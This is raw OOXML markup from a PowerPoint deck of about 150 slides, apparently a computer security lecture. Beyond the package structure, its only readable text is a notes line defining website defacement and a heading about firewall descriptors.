  <Override PartName="/ppt/slides/slide127.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide99.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide126.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide98.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide125.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide97.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide29.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide124.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide96.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide28.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide123.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide95.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide27.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide118.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide117.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide89.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide116.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide88.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide115.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide87.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide19.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide114.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide8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30.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide129.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80.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide43.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide34.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide130.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81.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide35.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide131.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide149.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide50.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide128.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide56.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide152.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40.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide146.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide51.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide147.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide52.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide145.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide49.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide136.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide148.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide54.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide150.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide44.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide140.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide53.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide137.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide151.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide55.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide36.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide132.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide141.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide45.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide144.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135.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide143.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide47.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide38.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide134.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide142.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide46.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide37.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide133.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09.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide42.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide7.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide41.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide2.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide108.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide79.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide107.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide57.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide14.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide110.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide82.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide20.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide119.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111.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide83.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide21.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide59.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide16.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide112.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide84.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide22.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide90.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide23.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide91.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120.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide24.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide92.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide68.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide25.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide121.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide93.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide69.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide26.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide122.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide94.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100.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide72.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide101.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide73.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide102.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103.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide76.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide104.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide77.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide105.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide78.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide106.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide113.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide17.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide8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368" r:id="rId122"/>
    <p:sldId id="369" r:id="rId123"/>
    <p:sldId id="370" r:id="rId124"/>
    <p:sldId id="371" r:id="rId125"/>
    <p:sldId id="372" r:id="rId126"/>
    <p:sldId id="373" r:id="rId127"/>
    <p:sldId id="374" r:id="rId128"/>
    <p:sldId id="375" r:id="rId129"/>
    <p:sldId id="376" r:id="rId130"/>
    <p:sldId id="377" r:id="rId131"/>
    <p:sldId id="378" r:id="rId132"/>
    <p:sldId id="379" r:id="rId133"/>
    <p:sldId id="380" r:id="rId134"/>
    <p:sldId id="381" r:id="rId135"/>
    <p:sldId id="382" r:id="rId136"/>
    <p:sldId id="383" r:id="rId137"/>
    <p:sldId id="384" r:id="rId138"/>
    <p:sldId id="385" r:id="rId139"/>
    <p:sldId id="386" r:id="rId140"/>
    <p:sldId id="387" r:id="rId141"/>
    <p:sldId id="388" r:id="rId142"/>
    <p:sldId id="389" r:id="rId143"/>
    <p:sldId id="390" r:id="rId144"/>
    <p:sldId id="391" r:id="rId145"/>
    <p:sldId id="392" r:id="rId146"/>
    <p:sldId id="393" r:id="rId147"/>
    <p:sldId id="394" r:id="rId148"/>
    <p:sldId id="395" r:id="rId149"/>
    <p:sldId id="396" r:id="rId150"/>
    <p:sldId id="397" r:id="rId151"/>
    <p:sldId id="398" r:id="rId152"/>
    <p:sldId id="399" r:id="rId153"/>
    <p:sldId id="400" r:id="rId154"/>
    <p:sldId id="401" r:id="rId155"/>
    <p:sldId id="402" r:id="rId156"/>
    <p:sldId id="403" r:id="rId157"/>
    <p:sldId id="404" r:id="rId158"/>
    <p:sldId id="405" r:id="rId159"/>
    <p:sldId id="406" r:id="rId160"/>
    <p:sldId id="407" r:id="rId161"/>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 Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide78.xml"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide79.xml"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide80.xml"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide81.xml"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide82.xml"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide83.xml"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide84.xml"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide85.xml"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide86.xml"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide87.xml"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide88.xml"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide89.xml"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide90.xml"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide91.xml"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide92.xml"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide93.xml"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide94.xml"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide95.xml"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide96.xml"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide97.xml"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide98.xml"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide99.xml"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide100.xml"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide101.xml"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide102.xml"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide103.xml"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide104.xml"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide105.xml"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide106.xml"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide107.xml"/><Relationship Id="rId117" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide108.xml"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide109.xml"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide110.xml"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide111.xml"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide112.xml"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide113.xml"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide114.xml"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide115.xml"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide116.xml"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide117.xml"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide118.xml"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide119.xml"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide120.xml"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide121.xml"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide122.xml"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide123.xml"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide124.xml"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide125.xml"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide126.xml"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide127.xml"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide128.xml"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide129.xml"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide130.xml"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide131.xml"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide132.xml"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide133.xml"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide134.xml"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide135.xml"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide136.xml"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide137.xml"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide138.xml"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide139.xml"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide140.xml"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide141.xml"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide142.xml"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide143.xml"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide144.xml"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide145.xml"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide146.xml"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide147.xml"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide148.xml"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide149.xml"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide150.xml"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide151.xml"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide152.xml"/><Relationship Id="rId16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rgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to move the slide</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28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290"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291" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="13"/>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292" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="14"/>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293" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="15"/>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C2E9C2DE-C106-4BA7-BE00-EAF013FFBDE2}"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_rels/notesSlide114.xml.rels><?xml version="1.0" encoding="UTF-8"?>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1.xml.rels><?xml version="1.0" encoding="UTF-8"?>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
</Relationships>
</file>

<file path=ppt/notesSlides/_rels/notesSlide129.xml.rels><?xml version="1.0" encoding="UTF-8"?>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34.xml.rels><?xml version="1.0" encoding="UTF-8"?>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
</Relationships>
</file>

<file path=ppt/notesSlides/_rels/notesSlide135.xml.rels><?xml version="1.0" encoding="UTF-8"?>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
</Relationships>
</file>

<file path=ppt/notesSlides/_rels/notesSlide137.xml.rels><?xml version="1.0" encoding="UTF-8"?>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
</Relationship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pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Website defacement</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> is an attack on a website that changes the visual appearance of the site or a webpage.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1096" name="TextShape 2"/>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C296C102-C9AD-4907-87A2-F3915D651162}"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1098" name="TextShape 2"/>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27ED07B4-9DE8-4537-A8BD-B6E1003B480A}"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1100" name="TextShape 2"/>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605817C3-72C4-42E0-8F99-70B598FCC238}"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1"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1102" name="TextShape 2"/>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68D6F8AA-C7D1-4799-85D5-A355DBA78544}"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1104" name="TextShape 2"/>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E6B6E66A-F5DA-4BD0-A785-9E2D97E575CC}"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 name="TextShape 1"/>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3CDB3EB7-0F4F-4FE7-8DB3-5FF6C11F0AD2}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1106"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pc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Common descriptors that can be implemented by a firewall</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">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 name="TextShape 1"/>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3CED962D-29E0-4B99-B950-D9578BDAA0B2}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1108"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 name="TextShape 1"/>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239A83A3-9B9D-4FCF-96E0-297EB2DB2261}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1110"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1112" name="TextShape 2"/>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22A5F47F-0EA6-483B-AE9C-D50029DE3DC3}"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3" name="TextShape 1"/>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5E1B2144-6EA1-4D98-AD20-6B017861847A}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
